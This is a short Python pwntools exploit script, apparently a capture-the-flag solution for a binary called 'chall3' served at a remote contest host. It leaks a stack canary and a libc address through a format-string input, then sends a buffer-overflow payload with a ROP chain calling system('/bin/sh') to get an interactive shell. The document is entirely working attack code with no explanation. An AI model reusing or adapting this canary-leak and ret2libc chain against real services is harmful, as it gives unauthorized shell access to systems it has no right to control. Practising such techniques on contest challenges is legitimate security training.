from pwn import *

debug = True

if debug == False:
    libc = ELF('libc.so.6')
    p = remote('hack.bckdr.in', 15103)
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./chall3')
payload = '%15$p %13$p'
print p.recv()
p.sendline(payload)
a = p.recv()
print a
libc.address = int(a.split()[0], 16)-231-libc.sym['__libc_start_main']
payload = 'A'*24
payload+= p64(int(a.split()[1], 16))
payload+= 'A'*8
payload+= p64(0x0000000000400813)+p64(libc.search('/bin/sh').next())
payload+= p64(0x0000000000400811)+p64(0)+p64(0)
payload+= p64(libc.sym['system'])
p.sendline(payload)
p.interactive()
